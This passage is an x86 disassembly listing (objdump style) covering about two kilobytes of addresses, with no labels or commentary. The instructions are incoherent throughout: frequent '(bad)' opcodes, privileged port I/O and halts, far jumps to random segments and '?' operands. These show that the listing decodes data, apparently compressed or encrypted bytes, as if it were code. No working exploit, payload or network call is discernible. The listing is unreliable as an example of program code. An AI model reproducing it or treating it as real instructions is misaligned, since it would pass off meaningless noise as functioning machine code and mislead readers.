  423b12:	mov    DWORD PTR [edi-0x531fedcd],0xa91a8d9d
  423b1c:	ja     0x423af2
  423b1e:	mov    dl,BYTE PTR [eax-0x62]
  423b21:	mov    al,ds:0x51d213b1
  423b26:	nop
  423b27:	sbb    al,0x62
  423b29:	test   eax,0xda6d0a65
  423b2e:	cmp    BYTE PTR [edx],dh
  423b30:	daa    
  423b31:	(bad)  
  423b32:	out    dx,eax
  423b33:	add    BYTE PTR [eax+0x7cc90297],bh
  423b39:	jp     0x423b4f
  423b3b:	shr    BYTE PTR [esi+eiz*4+0x55],cl
  423b3f:	mov    WORD PTR [ebx+0xdb6ee2f],es
  423b45:	mov    ch,0x13
  423b47:	pusha  
  423b48:	push   ds
  423b49:	retf   0xca69
  423b4c:	mov    al,ds:0x33e0de86
  423b51:	xor    esi,DWORD PTR [ecx+edx*8]
  423b54:	shr    BYTE PTR [edx-0x3af61489],1
  423b5a:	pop    es
  423b5b:	(bad)  
  423b5c:	shl    BYTE PTR [edx-0x1314eea2],1
  423b62:	stos   DWORD PTR es:[edi],eax
  423b63:	mov    ds:0xb0206853,eax
  423b68:	cmp    DWORD PTR [eax],eax
  423b6a:	pop    ss
  423b6b:	jmp    0x1a1a387e
  423b70:	xchg   ebp,edx
  423b72:	xor    al,0xff
  423b74:	push   0xfffffff7
  423b76:	push   ebp
  423b77:	loope  0x423b8f
  423b79:	sub    BYTE PTR ds:0x692e193,cl
  423b7f:	je     0x423b23
  423b81:	out    0x4a,eax
  423b83:	in     eax,dx
  423b84:	mov    eax,ds:0x42b3203f
  423b89:	data16 (bad) 
  423b8b:	out    dx,al
  423b8c:	sbb    dl,0xb3
  423b8f:	inc    eax
  423b90:	dec    esp
  423b91:	push   esi
  423b92:	adc    DWORD PTR [esi+0x73],esi
  423b95:	and    dh,al
  423b97:	(bad)  
  423b98:	int    0x91
  423b9a:	iret   
  423b9b:	or     DWORD PTR [ecx-0x5631e0b2],ebp
  423ba1:	div    BYTE PTR [ebp+0x54ce8b5c]
  423ba7:	sar    BYTE PTR [esi+0x773c5509],1
  423bad:	sbb    eax,0x10227a51
  423bb2:	xchg   BYTE PTR [edx+0x7557f79f],ch
  423bb8:	xchg   edi,eax
  423bb9:	imul   eax,DWORD PTR [esi+0x71],0x24
  423bbd:	and    bl,BYTE PTR [esi+ebx*2+0x1a]
  423bc1:	lds    esp,FWORD PTR [eax]
  423bc3:	or     edi,ebx
  423bc5:	adc    DWORD PTR [edi+0x2c],edx
  423bc8:	mov    esi,0x332e31ec
  423bcd:	popa   
  423bce:	div    DWORD PTR [edx+0x62]
  423bd1:	rcr    esp,cl
  423bd3:	in     al,dx
  423bd4:	cmp    eax,0x2f803b87
  423bd9:	retf   
  423bda:	pop    eax
  423bdc:	mov    ecx,0x15c5f2b
  423be1:	inc    edi
  423be2:	sub    DWORD PTR [ebp+0x658d65e1],esi
  423be8:	push   ss
  423be9:	repnz lods al,BYTE PTR ds:[esi]
  423beb:	mov    DWORD PTR [ebx+ebp*8-0x7],ebx
  423bef:	stos   DWORD PTR es:[edi],eax
  423bf0:	mov    WORD PTR [ebx+0x65a3dafa],?
  423bf6:	or     bl,BYTE PTR [edx+0x7d]
  423bf9:	fcmovbe st,st(1)
  423bfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423bfc:	push   0x45
  423bfe:	cdq    
  423bff:	ja     0x423c67
  423c01:	ror    DWORD PTR [edi+edi*8+0x3c],1
  423c05:	pop    eax
  423c06:	jp     0x423c6c
  423c08:	mov    ds:0x230239db,al
  423c0d:	loope  0x423be4
  423c0f:	cmp    DWORD PTR [esi-0x6d],eax
  423c12:	inc    eax
  423c13:	jmp    0x423bab
  423c15:	ja     0x423bae
  423c17:	fist   DWORD PTR [esi-0x5e2bab18]
  423c1d:	sbb    eax,0x5033ad55
  423c22:	ja     0x423c9a
  423c24:	xor    ch,BYTE PTR [esi+0x3f]
  423c27:	cdq    
  423c28:	out    0x17,eax
  423c2a:	sub    eax,0x6dc3bd2a
  423c2f:	sub    DWORD PTR [esi*2-0x1e20a0fd],edi
  423c36:	out    dx,eax
  423c37:	add    DWORD PTR [edx-0x52579967],eax
  423c3d:	lahf   
  423c3e:	into   
  423c3f:	xor    ch,dl
  423c41:	(bad)  [ebx+0x69b2c223]
  423c47:	lods   eax,DWORD PTR ds:[esi]
  423c48:	imul   ecx,DWORD PTR [edx+edx*2],0xffffffa3
  423c4c:	pop    ebx
  423c4d:	sbb    DWORD PTR [ecx+0x41],ebx
  423c50:	test   DWORD PTR [edi-0x6b],ebp
  423c53:	sbb    esi,DWORD PTR [edx]
  423c55:	std    
  423c56:	pusha  
  423c57:	xlat   BYTE PTR ds:[ebx]
  423c58:	push   es
  423c59:	shl    BYTE PTR [edx],1
  423c5b:	out    0x5e,al
  423c5d:	(bad)  
  423c5e:	cwde   
  423c5f:	call   0x1a2b:0xc3583f07
  423c66:	and    al,0x64
  423c68:	xor    eax,0xc4c951d9
  423c6d:	jl     0x423c7d
  423c6f:	xchg   esi,eax
  423c70:	sbb    al,0x9
  423c72:	sub    BYTE PTR [edx+0x18],bh
  423c75:	push   esp
  423c76:	pop    ebp
  423c77:	enter  0xcba7,0xf9
  423c7b:	adc    DWORD PTR [ebx+ebx*4+0x13012dbe],0x41fc82a9
  423c86:	dec    edx
  423c87:	push   cs
  423c88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c89:	add    al,0x26
  423c8b:	popf   
  423c8c:	out    0xca,al
  423c8e:	mov    ah,0xbf
  423c90:	pusha  
  423c91:	sub    eax,0x8a23161c
  423c96:	inc    eax
  423c97:	and    BYTE PTR [ebx],0x5
  423c9a:	inc    ebx
  423c9b:	mov    WORD PTR [edi],?
  423c9d:	push   cs
  423c9e:	ins    DWORD PTR es:[edi],dx
  423c9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ca0:	jmp    0x6f3e66dd
  423ca5:	jle    0x423c73
  423ca7:	pop    edi
  423ca8:	ss pop ebp
  423caa:	aam    0xeb
  423cac:	sub    al,0xf3
  423cae:	cld    
  423caf:	add    DWORD PTR ds:0xd8b04be7,ecx
  423cb5:	mov    bl,0x11
  423cb7:	nop
  423cb8:	and    bh,dh
  423cba:	clc    
  423cbb:	jge    0x423cfb
  423cbd:	imul   BYTE PTR [ecx-0x2a]
  423cc0:	shl    BYTE PTR [esi+0x71827d17],1
  423cc6:	add    DWORD PTR [edi+0x49],eax
  423cc9:	dec    esi
  423cca:	push   ecx
  423ccb:	push   ecx
  423ccc:	push   eax
  423ccd:	addr16 aaa 
  423ccf:	std    
  423cd0:	sti    
  423cd1:	rcl    DWORD PTR [ecx+0x4a],0xae
  423cd5:	popf   
  423cd6:	int3   
  423cd7:	mov    ecx,0xf581b75
  423cdc:	jnp    0x423d5b
  423cde:	ins    DWORD PTR es:[edi],dx
  423cdf:	lahf   
  423ce0:	fcmovbe st,st(7)
  423ce2:	mov    DWORD PTR [edi-0x633079c3],ecx
  423ce8:	xor    al,0xcc
  423cea:	sbb    al,0xc5
  423cec:	xchg   ecx,eax
  423ced:	mov    DWORD PTR [eax+eax*4-0x29],ecx
  423cf1:	jmp    0x423c9c
  423cf3:	cmp    BYTE PTR [eax-0x7a],bl
  423cf6:	pop    ecx
  423cf7:	gs mov ebx,0xa4b9478c
  423cfd:	out    0xf9,eax
  423cff:	popa   
  423d00:	xor    BYTE PTR [ebx+0x30],al
  423d03:	outs   dx,BYTE PTR ds:[esi]
  423d04:	or     eax,0xab32cc9b
  423d09:	push   eax
  423d0a:	mov    eax,ds:0x768e7b60
  423d0f:	mov    cl,0xb9
  423d11:	fild   DWORD PTR [esi+0x7f]
  423d14:	push   esp
  423d15:	mov    bl,0x33
  423d17:	inc    esi
  423d19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d1a:	repz jno 0x423cfa
  423d1d:	sub    bh,BYTE PTR [edi]
  423d1f:	mov    esi,0x51dcbeaf
  423d24:	jmp    0x665e799c
  423d29:	mov    esp,0x317c013d
  423d2e:	mov    bl,0xcc
  423d30:	leave  
  423d31:	mov    cl,0x2c
  423d33:	out    0xe5,eax
  423d35:	pop    es
  423d36:	sub    BYTE PTR [esi],0x5
  423d39:	pop    ds
  423d3a:	pop    ss
  423d3b:	dec    esp
  423d3c:	dec    edi
  423d3d:	mov    ch,ch
  423d3f:	xchg   ebp,eax
  423d40:	mov    al,ds:0x887d36a4
  423d45:	rcl    al,1
  423d47:	mov    edx,0x5f4aa6d8
  423d4c:	mov    bl,BYTE PTR [ebp+0x3590830c]
  423d52:	add    ecx,DWORD PTR [eax+0x3b3cb167]
  423d58:	push   0xffffffa7
  423d5a:	shr    edx,cl
  423d5c:	push   ds
  423d5d:	gs sbb al,0xb
  423d60:	and    dh,BYTE PTR [ecx+esi*1-0x1b]
  423d64:	je     0x423d2f
  423d66:	adc    eax,0x439ff6cf
  423d6b:	and    ecx,ebp
  423d6d:	sub    eax,0x63465b4a
  423d72:	cs ss inc esp
  423d75:	pushf  
  423d76:	and    eax,DWORD PTR [ebp-0x5e]
  423d79:	mov    DWORD PTR [ebx+0x4b],edx
  423d7c:	div    BYTE PTR [ecx-0x76e4dc9a]
  423d82:	popf   
  423d83:	stos   DWORD PTR es:[edi],eax
  423d84:	lea    ebx,[ebp-0x1d]
  423d87:	xchg   edi,eax
  423d88:	jne    0x423d89
  423d8a:	sub    DWORD PTR [ebx-0x2f],eax
  423d8d:	add    eax,0x65cefbd3
  423d92:	je     0x423d92
  423d94:	cs jecxz 0x423de0
  423d97:	push   ds
  423d98:	js     0x423d1e
  423d9a:	ret    0x4891
  423d9d:	cmp    bh,al
  423d9f:	push   0x55
  423da1:	ss or  ch,ch
  423da4:	aam    0xa6
  423da6:	cdq    
  423da7:	retf   0xf3ba
  423daa:	cwde   
  423dab:	cmp    BYTE PTR [ecx],ah
  423dad:	sub    BYTE PTR [esi+0x4cd8358e],cl
  423db3:	pop    es
  423db4:	and    esp,DWORD PTR [ebp-0x85eded0]
  423dba:	ins    BYTE PTR es:[edi],dx
  423dbb:	pop    ebp
  423dbc:	lods   al,BYTE PTR ds:[esi]
  423dbd:	(bad)  
  423dbe:	pop    ds
  423dbf:	adc    eax,0x3ef2bb65
  423dc4:	stos   DWORD PTR es:[edi],eax
  423dc5:	and    al,0xd1
  423dc7:	out    dx,eax
  423dc8:	in     eax,0x2a
  423dca:	stos   BYTE PTR es:[edi],al
  423dcb:	retf   
  423dcc:	aaa    
  423dcd:	fwait
  423dce:	xchg   ebp,eax
  423dcf:	mov    ecx,fs
  423dd1:	mov    gs,WORD PTR [eax+0x1093ee73]
  423dd7:	imul   esi,DWORD PTR [edi],0x5d7fc52e
  423ddd:	outs   dx,BYTE PTR ds:[esi]
  423dde:	jb     0x423def
  423de0:	mov    BYTE PTR [ecx],bh
  423de2:	add    ah,0xef
  423de5:	loopne 0x423d90
  423de7:	mov    ebp,cs
  423de9:	pop    eax
  423dea:	push   ecx
  423deb:	das    
  423dec:	adc    al,0xf8
  423dee:	mov    bh,0xef
  423df0:	in     al,0xe2
  423df2:	test   BYTE PTR [esi],0xf4
  423df5:	inc    edx
  423df6:	pop    edi
  423df7:	(bad)  
  423df8:	push   edx
  423df9:	out    0x7a,al
  423dfb:	in     eax,dx
  423dfc:	sub    eax,0x34a89648
  423e01:	xchg   esp,eax
  423e02:	fcomp  QWORD PTR [eax+0x5]
  423e05:	sub    al,0x9
  423e07:	mov    esp,eax
  423e09:	mov    al,ds:0x44576677
  423e0e:	fwait
  423e0f:	popf   
  423e10:	jecxz  0x423ddd
  423e12:	sbb    ebx,DWORD PTR [eax]
  423e14:	adc    DWORD PTR [edi+0x439da13d],0x26317dd5
  423e1e:	mov    dh,0xa8
  423e20:	pop    esp
  423e21:	and    eax,0x442f6a06
  423e26:	push   ecx
  423e27:	mov    ebx,0x643074ba
  423e2c:	fldl2t 
  423e2e:	mov    ecx,0xee2db4db
  423e33:	mov    eax,0xc50777da
  423e38:	aam    0xe4
  423e3a:	mov    esp,0xd462fbc2
  423e3f:	aad    0x27
  423e41:	jns    0x423def
  423e43:	mov    ebp,edx
  423e45:	enter  0xb136,0x68
  423e49:	jns    0x423e89
  423e4b:	jo     0x423ebc
  423e4d:	sti    
  423e4e:	sbb    DWORD PTR [ecx+ebp*1],esp
  423e51:	rcr    BYTE PTR [edx+eax*4],0x54
  423e55:	inc    eax
  423e56:	fcmovnbe st,st(3)
  423e58:	pusha  
  423e59:	mov    al,0x6a
  423e5b:	sbb    BYTE PTR [esi-0x51],0x8
  423e5f:	mov    al,0x42
  423e61:	pop    esi
  423e62:	mov    ds:0x8c2c6140,al
  423e67:	push   eax
  423e68:	ret    0xb886
  423e6b:	or     DWORD PTR [esi-0x531e697],edi
  423e71:	js     0x423ee7
  423e73:	(bad)  
  423e74:	int3   
  423e75:	pop    edx
  423e76:	jmp    0xd14ae7fb
  423e7b:	jl     0x423e09
  423e7d:	sub    edx,esi
  423e7f:	mov    edi,0x9c8fe873
  423e84:	mov    ah,0xc4
  423e86:	ret    0x8672
  423e89:	(bad)  
  423e8a:	addr16 push esi
  423e8c:	daa    
  423e8d:	ins    BYTE PTR es:[edi],dx
  423e8e:	add    dl,BYTE PTR [esi]
  423e90:	fst    DWORD PTR [ebp+0x17]
  423e93:	mov    BYTE PTR [edx-0x1779151],ah
  423e99:	cmp    ecx,ebx
  423e9b:	jne    0x423e63
  423e9d:	iret   
  423e9e:	or     al,ah
  423ea0:	popa   
  423ea1:	and    ah,bh
  423ea3:	or     cl,BYTE PTR [ebp-0x37]
  423ea6:	mov    eax,ds:0x5e4f626d
  423eab:	popf   
  423eac:	arpl   WORD PTR [esi+0x5],dx
  423eaf:	push   esp
  423eb0:	or     eax,0x26c15d8
  423eb5:	add    DWORD PTR [ecx-0x2aa8fb71],eax
  423ebb:	sub    ch,BYTE PTR [ecx]
  423ebd:	push   0x6a
  423ebf:	xchg   BYTE PTR [ecx+0x11b9512a],ah
  423ec5:	add    eax,0x6dc60538
  423eca:	pop    ebp
  423ecb:	dec    ebx
  423ecc:	push   ds
  423ecd:	push   ecx
  423ece:	(bad)  
  423ed0:	dec    esi
  423ed1:	sub    al,0x95
  423ed3:	(bad)  
  423ed4:	ins    BYTE PTR es:[edi],dx
  423ed5:	mov    ebx,0x9c0d3343
  423eda:	cdq    
  423edb:	fldcw  WORD PTR [edx+edx*8+0x5a]
  423edf:	or     eax,0x747cbe02
  423ee4:	dec    edx
  423ee5:	leave  
  423ee6:	jg     0x423ef4
  423ee8:	fmul   QWORD PTR [eax+0x41]
  423eeb:	add    al,0xae
  423eed:	push   esi
  423eee:	jns    0x423eef
  423ef0:	lock inc esp
  423ef2:	outs   dx,DWORD PTR ds:[esi]
  423ef3:	call   FWORD PTR [esi]
  423ef5:	cmp    ecx,DWORD PTR [edi-0x7da1131]
  423efb:	xchg   edi,eax
  423efc:	shl    BYTE PTR [eax-0x5d916cbd],1
  423f02:	ds retf 0x2297
  423f06:	pop    ebp
  423f07:	dec    ebp
  423f08:	out    0x23,al
  423f0a:	xchg   esp,eax
  423f0b:	mov    al,0xb4
  423f0d:	jge    0x423f1c
  423f0f:	mov    edx,0x2a4aa21d
  423f15:	pop    edx
  423f16:	adc    ah,dl
  423f18:	jae    0x423f08
  423f1a:	les    esi,FWORD PTR [ebx+0x179fa409]
  423f20:	sahf   
  423f21:	and    ebx,DWORD PTR [eax-0x21]
  423f24:	xor    DWORD PTR ds:0x9f357bf9,eax
  423f2a:	xchg   ecx,eax
  423f2b:	xor    edx,edx
  423f2d:	mov    ah,0x59
  423f2f:	jae    0x423f0a
  423f31:	mov    esi,DWORD PTR [edx]
  423f33:	push   ss
  423f34:	xor    bl,BYTE PTR [eax+0x4e]
  423f37:	pusha  
  423f38:	xchg   ecx,eax
  423f39:	scas   eax,DWORD PTR es:[edi]
  423f3a:	pop    esp
  423f3b:	ins    BYTE PTR es:[edi],dx
  423f3c:	imul   dh
  423f3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f40:	adc    eax,0x902d5cae
  423f45:	xchg   ebx,eax
  423f46:	ja     0x423f42
  423f48:	daa    
  423f49:	sub    DWORD PTR [ebx+edi*4],eax
  423f4c:	add    BYTE PTR [ebx-0x1b],dh
  423f4f:	call   0xcea5290b
  423f54:	stc    
  423f55:	shr    BYTE PTR [ebp+0x2d],cl
  423f58:	shl    BYTE PTR [ecx-0x50],cl
  423f5b:	sahf   
  423f5c:	or     al,0x96
  423f5e:	aad    0xdf
  423f60:	repnz adc eax,0xf6f284f1
  423f66:	push   cs
  423f67:	push   ds
  423f68:	arpl   WORD PTR [edi+0x38f2a996],ax
  423f6e:	sub    al,0x16
  423f70:	xchg   ecx,eax
  423f71:	mov    ecx,0xc11e6cbc
  423f76:	popf   
  423f77:	xchg   edi,eax
  423f78:	xor    BYTE PTR [ebp-0x7bc4e0f3],cl
  423f7e:	cmp    DWORD PTR [ecx],edx
  423f80:	pop    ebx
  423f81:	rcr    esi,cl
  423f83:	aaa    
  423f84:	mov    eax,0x6a804112
  423f89:	pop    ebp
  423f8a:	out    dx,eax
  423f8b:	cmp    eax,0xa1d30e71
  423f90:	mov    ds:0xee7d601a,eax
  423f95:	cmp    eax,0x4f36eaf0
  423f9a:	dec    edx
  423f9b:	pop    ds
  423f9c:	jbe    0x423fec
  423f9e:	jnp    0x423f94
  423fa0:	push   ds
  423fa1:	mov    edx,0x4277f961
  423fa6:	repz test eax,0xfddcf4e3
  423fac:	neg    BYTE PTR [eax]
  423fae:	xchg   ebp,eax
  423faf:	jne    0x424017
  423fb1:	push   esp
  423fb2:	xchg   edi,eax
  423fb3:	add    BYTE PTR [edi-0x15e265b0],dh
  423fb9:	and    ecx,DWORD PTR [esi+0x249a27ae]
  423fbf:	fadd   QWORD PTR [ebx-0x6a]
  423fc2:	ror    BYTE PTR [ecx-0x338d4542],1
  423fc8:	popa   
  423fc9:	mov    bl,0x32
  423fcb:	in     al,0x23
  423fcd:	dec    ecx
  423fce:	test   DWORD PTR [ecx],esp
  423fd0:	fistp  WORD PTR [ebp+0x9f5016f]
  423fd6:	test   al,0x8f
  423fd8:	sbb    cl,BYTE PTR [edi+0x67]
  423fdb:	sub    DWORD PTR [ebp-0x63],0x380ce63b
  423fe2:	push   ds
  423fe3:	call   0x44270222
  423fe8:	sbb    al,0xfd
  423fea:	fcomp  QWORD PTR es:[edx-0x16]
  423fee:	sub    DWORD PTR [esi+0x112d09cc],esp
  423ff4:	hlt    
  423ff5:	call   0x2690bee0
  423ffa:	lods   eax,DWORD PTR ds:[esi]
  423ffb:	je     0x424013
  423ffd:	push   ecx
  423ffe:	iret   
  423fff:	mov    ebx,0xd3000c3f
  424004:	pop    ds
  424005:	add    bh,BYTE PTR [eax-0x1e]
  424008:	sar    ebx,cl
  42400a:	loopne 0x424053
  42400c:	dec    esi
  42400d:	aad    0xfe
  42400f:	push   ebp
  424010:	lahf   
  424011:	pop    ecx
  424012:	fwait
  424013:	(bad)  
  424014:	mov    ch,0x10
  424016:	inc    ebp
  424017:	int    0xa5
  424019:	pop    esp
  42401a:	(bad)  
  42401b:	fldcw  WORD PTR [esi-0x7db44fb1]
  424021:	arpl   WORD PTR ds:0xfde6d5d1,bx
  424027:	jmp    0xa306574a
  42402c:	xchg   esi,eax
  42402d:	aad    0x35
  42402f:	push   ebx
  424030:	cmc    
  424031:	loop   0x42406a
  424033:	pushf  
  424034:	cmp    al,0xe5
  424036:	aad    0xd6
  424038:	sbb    BYTE PTR [ecx+0x4],ah
  42403b:	push   es
  42403c:	mov    dh,0x44
  42403e:	cwde   
  42403f:	cmp    ebp,edx
  424041:	js     0x42406b
  424043:	xor    edi,esp
  424045:	repnz sahf 
  424047:	sbb    DWORD PTR [ebp-0x14],0xffffff92
  42404b:	in     al,dx
  42404c:	imul   edi,DWORD PTR [edi+0x688cc604],0x36
  424053:	mov    dl,0xf3
  424055:	test   al,0xbc
  424057:	(bad)  
  424059:	pop    ebx
  42405a:	xchg   edx,eax
  42405b:	jmp    0xe6d3:0x4dbdbacc
  424062:	or     DWORD PTR [ecx+edi*8-0x266dd477],eax
  424069:	rcr    BYTE PTR [ecx-0x4],0xa2
  42406d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42406e:	inc    edx
  42406f:	sti    
  424070:	mov    bl,bh
  424072:	push   edx
  424073:	sbb    DWORD PTR [esi-0x59],eax
  424076:	cmc    
  424077:	jns    0x4240d1
  424079:	adc    BYTE PTR [ebx-0x51d301d4],ah
  42407f:	xchg   esi,eax
  424080:	cdq    
  424081:	and    edi,DWORD PTR [ebp-0x7b]
  424084:	frstpm(287 only) 
  424086:	cmp    dh,dh
  424088:	mov    DWORD PTR [ecx-0x55],0xf207257e
  42408f:	test   al,0x2f
  424091:	push   es
  424092:	arpl   WORD PTR [edi],bp
  424094:	les    esp,FWORD PTR [ecx-0x6]
  424097:	adc    DWORD PTR [eax+0x727ce354],edi
  42409d:	push   cs
  42409e:	push   esi
  42409f:	push   ebp
  4240a0:	jl     0x42407e
  4240a2:	ds repnz jmp 0xce77:0x16e0ef75
  4240ab:	mov    ds:0x6063a920,eax
  4240b0:	leave  
  4240b1:	stc    
  4240b2:	clc    
  4240b3:	or     eax,0x1bcc81ff
  4240b8:	jmp    0x1b5f:0xeb18118a
  4240bf:	mov    ebp,0x3928a991
  4240c4:	sbb    ecx,DWORD PTR [ebp+0x51]
  4240c7:	fxtract 
  4240c9:	sbb    al,BYTE PTR [ebp-0x5]
  4240cc:	xchg   ecx,eax
  4240cd:	in     al,0xf1
  4240cf:	jmp    0xa241a5a
  4240d4:	js     0x4240a2
  4240d6:	cmp    DWORD PTR [esi-0x4f7e05bb],eax
  4240dc:	xchg   esi,eax
  4240dd:	call   0xba0b:0xdfef9453
  4240e4:	add    eax,0x6469c3f3
  4240e9:	push   0x5d
  4240eb:	mov    WORD PTR [edx+0x62],gs
  4240ee:	div    ah
  4240f0:	jo     0x424089
  4240f2:	push   esi
  4240f3:	adc    eax,0x9318623b
  4240f8:	push   0x65906369
  4240fd:	pusha  
  4240fe:	cmp    al,0xd4
  424100:	adc    ch,bl
  424102:	mov    ds:0xeb03f7f1,eax
  424107:	xor    al,0xd1
  424109:	xor    eax,0x60db622f
  42410e:	gs or  eax,0x2a2c2db0
  424114:	dec    ebp
  424115:	fisttp DWORD PTR [ebx+ebp*4+0x158e5ef1]
  42411c:	aam    0xbc
  42411e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42411f:	xchg   edx,eax
  424120:	adc    bl,BYTE PTR [eax]
  424122:	jbe    0x4240c2
  424124:	jmp    0x75d:0xc1566afa
  42412b:	test   BYTE PTR [ebp-0x39],ah
  42412e:	bnd jge 0x424147
  424131:	push   ecx
  424132:	das    
  424133:	add    eax,0xd4eac49
  424138:	adc    eax,0xbe194edb
  42413d:	add    ebp,eax
  42413f:	loop   0x424154
  424141:	fisttp DWORD PTR [esi]
  424143:	or     eax,0xb18a1f99
  424148:	pushf  
  424149:	ficom  WORD PTR [edx+0x1f74a2ce]
  42414f:	jmp    0x4241c5
  424151:	add    DWORD PTR [eax+eax*4+0x1174269d],esi
  424158:	pop    esp
  424159:	ja     0x424185
  42415b:	inc    ecx
  42415c:	xchg   BYTE PTR [ecx+0x5d],ah
  42415f:	sbb    DWORD PTR [edi+0x7129ccf6],edi
  424165:	jl     0x424109
  424167:	pop    es
  424168:	cmp    al,0x6
  42416a:	cmp    al,0xab
  42416c:	cmc    
  42416d:	shr    dh,1
  42416f:	jae    0x424193
  424171:	push   0x7
  424173:	arpl   WORD PTR [esi-0x466cb06c],cx
  424179:	lods   al,BYTE PTR ds:[esi]
  42417a:	ja     0x424152
  42417c:	and    eax,DWORD PTR [eax+edx*1]
  42417f:	mov    ebx,0xd4bbd305
  424184:	test   DWORD PTR [eax+0x20a56159],esi
  42418a:	into   
  42418b:	rol    BYTE PTR [edx+0x78],cl
  42418e:	mov    dl,0x40
  424190:	mov    dl,BYTE PTR [ecx+0x5c]
  424193:	mov    ss,WORD PTR [edi+edi*1+0x494c6ddb]
  42419a:	xchg   edi,eax
  42419b:	add    ah,BYTE PTR [esp+eiz*8-0x72]
  42419f:	jae    0x424210
  4241a1:	dec    ebp
  4241a2:	add    BYTE PTR ds:0x49404f39,ch
  4241a8:	xchg   ebx,eax
  4241a9:	mov    eax,0x646e7007
  4241ae:	in     eax,0x56
  4241b0:	push   0x1a8d9314
  4241b5:	aad    0xf7
  4241b7:	pop    ds
  4241b8:	cld    
  4241b9:	xchg   esi,eax
  4241ba:	imul   BYTE PTR [edx-0x4e51d8b6]
  4241c0:	push   es
  4241c1:	add    eax,0xdc2c47f3
  4241c6:	mov    esp,0xcd1a733c
  4241cb:	mov    esi,0x5bec255
  4241d0:	sub    DWORD PTR [esp+eax*2-0xa182822],esi
  4241d7:	retf   
  4241d8:	cwde   
  4241d9:	ja     0x4241dc
  4241db:	mov    bh,0x62
  4241dd:	add    eax,0xd907677
  4241e2:	jecxz  0x424188
  4241e4:	pushf  
  4241e5:	jo     0x42416b
  4241e7:	xchg   esp,eax
  4241e8:	xor    esi,DWORD PTR [esi+0x32]
  4241eb:	mov    eax,ds:0x6941153a
  4241f0:	jbe    0x424240
  4241f2:	(bad)  
  4241f3:	mov    ?,ecx
  4241f5:	and    bh,cl
  4241f7:	mov    bh,0x7
  4241f9:	jns    0x42421e
  4241fb:	xchg   ebp,eax
  4241fc:	pop    ecx
  4241fd:	pop    esp
  4241fe:	jo     0x424202
  424200:	sbb    bl,BYTE PTR [edi+0x2a]
  424203:	adc    ecx,esi
  424205:	xchg   edi,eax
  424206:	jne    0x4241d8
  424208:	das    
  424209:	inc    ebx
  42420a:	hlt    
  42420b:	pusha  
  42420c:	add    BYTE PTR [ecx-0x10899c],0x83
  424213:	dec    eax
  424214:	scas   al,BYTE PTR es:[edi]
  424215:	inc    eax
  424216:	out    dx,al
  424217:	xor    al,0x78
  424219:	stos   DWORD PTR es:[edi],eax
  42421a:	xchg   edx,eax
  42421b:	and    esp,DWORD PTR ds:0xfbd5f25b
  424221:	pop    ecx
  424222:	ins    DWORD PTR es:[edi],dx
  424223:	adc    esi,DWORD PTR [eax-0x2785ced5]
  424229:	mov    eax,0xbd483d9d
  42422e:	popa   
  42422f:	fcom   DWORD PTR [ecx-0xb334cbd]
  424235:	mov    al,ds:0x53f98cdc
  42423a:	push   ds
  42423b:	cmp    BYTE PTR [edi+0x2a],ch
  42423e:	ret    
  42423f:	out    dx,eax
  424240:	xor    BYTE PTR [esi],cl
  424242:	mov    ebx,DWORD PTR [edx]
  424244:	jle    0x42423a
  424246:	pop    ss
  424247:	jae    0x424289
  424249:	mov    ebx,0x24317826
  42424e:	jbe    0x42425a
  424250:	dec    ebp
  424251:	pop    ss
  424252:	(bad)  
  424253:	sub    al,0x49
  424255:	mov    cl,0x7f
  424257:	add    al,BYTE PTR [esi-0x554d85d7]
  42425d:	mov    ds:0x971b1981,al
  424262:	dec    ecx
  424263:	push   0x17d24b38
  424268:	xor    eax,DWORD PTR [ecx+0x65551234]
  42426e:	out    dx,al
  42426f:	jae    0x4242d8
  424271:	jb     0x4241fd
  424273:	inc    esp
  424274:	scas   al,BYTE PTR es:[edi]
  424275:	jg     0x424218
  424277:	fwait
  424278:	add    eax,0xdf08425c
  42427d:	fdiv   QWORD PTR [edx]
  42427f:	xchg   esp,eax
  424280:	pushf  
  424281:	ja     0x424283
  424283:	cli    
  424284:	cmp    al,0x27
  424286:	inc    DWORD PTR [ecx-0x9]
  424289:	sub    eax,0x5c2aede1
  42428e:	loopne 0x4242c6
  424290:	loop   0x42421f
  424292:	icebp  
  424293:	aad    0xbc
  424295:	aad    0x30
  424297:	loopne 0x424279
  424299:	lea    edx,[ebx]
  42429b:	scas   eax,DWORD PTR es:[edi]
  42429c:	je     0x424255
  42429e:	stos   BYTE PTR es:[edi],al
  42429f:	or     ecx,DWORD PTR [ecx-0x5bcb4710]
  4242a5:	mov    dh,0xbb
  4242a7:	mov    eax,ds:0xc43800e5
  4242ac:	call   FWORD PTR [esi+0xb9d2470]
  4242b2:	xchg   edx,eax
  4242b3:	jmp    DWORD PTR [esi+0x6d]
  4242b6:	adc    BYTE PTR [eax+0x6cee4087],cl
  4242bc:	jnp    0x4242df
  4242be:	mov    al,BYTE PTR [edi]
  4242c0:	imul   ecx,DWORD PTR [eax],0xffffffb2
  4242c3:	mov    al,ds:0x6fc97729
  4242c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242c9:	repz ror BYTE PTR ds:0x47570031,0xa8
  4242d1:	into   
  4242d2:	add    DWORD PTR [edi+0xc0e7237],ecx
  4242d8:	cmp    dh,cl
  4242da:	inc    eax
  4242db:	mov    edi,0x28bb3f9f
  4242e0:	push   esp
  4242e1:	cmp    al,0x3
  4242e3:	jl     0x42428e
  4242e5:	jmp    0xa2b66774
  4242ea:	pop    edi
  4242eb:	(bad)  
  4242ec:	mov    ebx,DWORD PTR [ebp+0x46401bfe]
  4242f2:	sub    al,0x0
  4242f4:	and    ch,BYTE PTR ds:0x76e3a99
  4242fa:	dec    edx
  4242fb:	stos   DWORD PTR es:[edi],eax
  4242fc:	aaa    
  4242fd:	jecxz  0x424328
  4242ff:	xor    DWORD PTR [eax-0xa3169d0],esp
  424305:	clc    
  424306:	test   al,0x21
  424308:	(bad)  
  424309:	bound  esp,QWORD PTR [ebp-0x4c2fd0c6]
  42430f:	pop    edx
  424310:	sbb    bl,BYTE PTR [edx-0x13]
  424313:	jns    0x424335
